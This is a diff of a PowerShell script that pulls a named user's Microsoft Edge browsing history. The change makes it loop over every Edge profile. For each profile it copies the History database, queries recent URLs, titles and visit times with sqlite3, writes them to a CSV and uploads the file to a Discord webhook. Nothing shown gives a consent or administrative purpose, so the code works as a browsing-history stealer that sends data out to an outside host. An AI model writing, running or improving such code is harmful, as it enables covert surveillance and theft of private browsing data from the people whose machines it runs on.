@@ -23,16 +23,14 @@ if (-not $webhookUrl) {
     exit
 }
 
-# Build Edge history path
-$edgeHistoryPath = "C:\Users\$GetUser\AppData\Local\Microsoft\Edge\User Data\Default\History"
-if (-not (Test-Path $edgeHistoryPath)) {
-    Write-Error "Edge history file not found for user '$GetUser'. Path: $edgeHistoryPath"
+# Find all Edge profiles for the user
+$edgeUserDataPath = "C:\Users\$GetUser\AppData\Local\Microsoft\Edge\User Data"
+$profiles = Get-ChildItem -Path $edgeUserDataPath -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" }
+
+if (-not $profiles) {
+    Write-Error "No Edge profiles found for user '$GetUser'."
     exit
 }
-
-# Copy the history file to temp (Edge may lock the file)
-$tempHistory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-EdgeHistory.db")
-Copy-Item $edgeHistoryPath $tempHistory -Force
 
 # Calculate Chrome/Edge epoch time for filtering
 $now = Get-Date
@@ -41,61 +39,88 @@ $minDate = $now.AddDays(-$DaysBack)
 $epoch = [datetime]::Parse('1601-01-01T00:00:00Z')
 $minVisitTime = [math]::Round(($minDate.ToUniversalTime() - $epoch).TotalMilliseconds * 10)
 
-# Ensure sqlite3.exe is available, download if missing
-$sqliteExe = Join-Path $PSScriptRoot "sqlite3.exe"
-if (-not (Test-Path $sqliteExe)) {
-    Write-Host "sqlite3.exe not found, downloading..."
-    $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
-    $zipPath = Join-Path $env:TEMP "sqlite.zip"
-    Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $PSScriptRoot)
-    Remove-Item $zipPath
-    $sqliteExe = Get-ChildItem -Path $PSScriptRoot -Filter "sqlite3.exe" -Recurse | Select-Object -First 1 | ForEach-Object { $_.FullName }
-    if (-not $sqliteExe) {
-        Write-Error "Failed to download sqlite3.exe."
+# Process each profile
+foreach ($profile in $profiles) {
+    $profileName = $profile.Name
+    $edgeHistoryPath = Join-Path $profile.FullName "History"
+    if (-not (Test-Path $edgeHistoryPath)) {
+        Write-Warning "History file not found for profile '$profileName'. Skipping."
+        continue
+    }
+
+    # Copy the history file to temp (Edge may lock the file)
+    $tempHistory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-$profileName-EdgeHistory.db")
+    Copy-Item $edgeHistoryPath $tempHistory -Force
+
+    # Ensure sqlite3.exe is available, download if missing
+    $sqliteDir = Join-Path $PSScriptRoot "sqlite-tools-win32-x86-3430100"
+    $sqliteExe = Join-Path $sqliteDir "sqlite3.exe"
+    if (-not (Test-Path $sqliteExe)) {
+        Write-Host "sqlite3.exe not found, downloading..."
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
+        $zipPath = Join-Path $env:TEMP "sqlite.zip"
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $PSScriptRoot)
+        Remove-Item $zipPath
+    }
+
+    # Query the SQLite DB for URLs
+    try {
+        $query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= $minVisitTime ORDER BY last_visit_time DESC LIMIT 50;"
+        $history = & $sqliteExe $tempHistory "$query"
+    } catch {
+        Write-Error "Error querying Edge history for profile '$profileName': $_"
         Remove-Item $tempHistory
-        exit
+        continue
     }
-}
 
-# Query the SQLite DB for URLs
-try {
-    $query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= $minVisitTime ORDER BY last_visit_time DESC LIMIT 50;"
-    $history = & $sqliteExe $tempHistory "$query"
-} catch {
-    Write-Error "Error querying Edge history: $_"
+# Write results to temp CSV file
+    $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$env:COMPUTERNAME-$GetUser-$profileName.csv")
+    "Edge Browsing History for user: $GetUser, Profile: $profileName (last $DaysBack days)" | Out-File -FilePath $tempFile
+    "Source: $edgeHistoryPath" | Out-File -FilePath $tempFile -Append
+    "" | Out-File -FilePath $tempFile -Append
+    "URL,Title,Visit Time" | Out-File -FilePath $tempFile -Append
+
+    # Parse and format history as CSV
+    $historyLines = $history -split "`n" | Where-Object { $_ -match '\|' }
+    foreach ($line in $historyLines) {
+        $parts = $line -split '\|'
+        if ($parts.Count -ge 3) {
+            $url = '"' + $parts[0].Trim().Replace('"', '""') + '"'
+            $title = '"' + $parts[1].Trim().Replace('"', '""') + '"'
+            $visitTimeRaw = $parts[2].Trim()
+            try {
+                $visitTime = [DateTime]::FromFileTimeUtc([long]$visitTimeRaw * 10)
+                $visitTimeFormatted = $visitTime.ToString("yyyy-MM-dd HH:mm:ss")
+            } catch {
+                $visitTimeFormatted = $visitTimeRaw  # Fallback to raw if conversion fails
+            }
+            "$url,$title,$visitTimeFormatted" | Out-File -FilePath $tempFile -Append
+        }
+    }
+
+    # Send the file to Discord using HttpClient for multipart
+    try {
+        Add-Type -AssemblyName System.Net.Http
+        $client = New-Object System.Net.Http.HttpClient
+        $content = New-Object System.Net.Http.MultipartFormDataContent
+        $content.Add([System.Net.Http.StringContent]::new(":file_folder: Edge history for profile '$profileName' attached."), "content")
+        $fileStream = [System.IO.File]::OpenRead($tempFile)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($tempFile))
+        $response = $client.PostAsync($webhookUrl, $content).Result
+        if (-not $response.IsSuccessStatusCode) {
+            Write-Error "Failed to send to Discord for profile '$profileName': $($response.StatusCode) - $($response.ReasonPhrase)"
+        }
+    } catch {
+        Write-Error "Error sending to Discord for profile '$profileName': $_"
+    } finally {
+        if ($fileStream) { $fileStream.Close() }
+        if ($client) { $client.Dispose() }
+    }
+
+    # Clean up temp files
     Remove-Item $tempHistory
-    exit
+    Remove-Item $tempFile
 }
-
-# Write results to temp file
-$tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-EdgeHistory.txt")
-"Edge Browsing History for user: $GetUser" | Out-File -FilePath $tempFile
-"Source: $edgeHistoryPath" | Out-File -FilePath $tempFile -Append
-"" | Out-File -FilePath $tempFile -Append
-$history | Out-File -FilePath $tempFile -Append
-
-# Send the file to Discord using HttpClient for multipart
-try {
-    Add-Type -AssemblyName System.Net.Http
-    $client = New-Object System.Net.Http.HttpClient
-    $content = New-Object System.Net.Http.MultipartFormDataContent
-    $content.Add([System.Net.Http.StringContent]::new(":file_folder: Edge history attached."), "content")
-    $fileStream = [System.IO.File]::OpenRead($tempFile)
-    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-    $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($tempFile))
-    $response = $client.PostAsync($webhookUrl, $content).Result
-    if (-not $response.IsSuccessStatusCode) {
-        Write-Error "Failed to send to Discord: $($response.StatusCode) - $($response.ReasonPhrase)"
-    }
-} catch {
-    Write-Error "Error sending to Discord: $_"
-} finally {
-    if ($fileStream) { $fileStream.Close() }
-    if ($client) { $client.Dispose() }
-}
-
-# Clean up temp files
-Remove-Item $tempHistory
-Remove-Item $tempFile
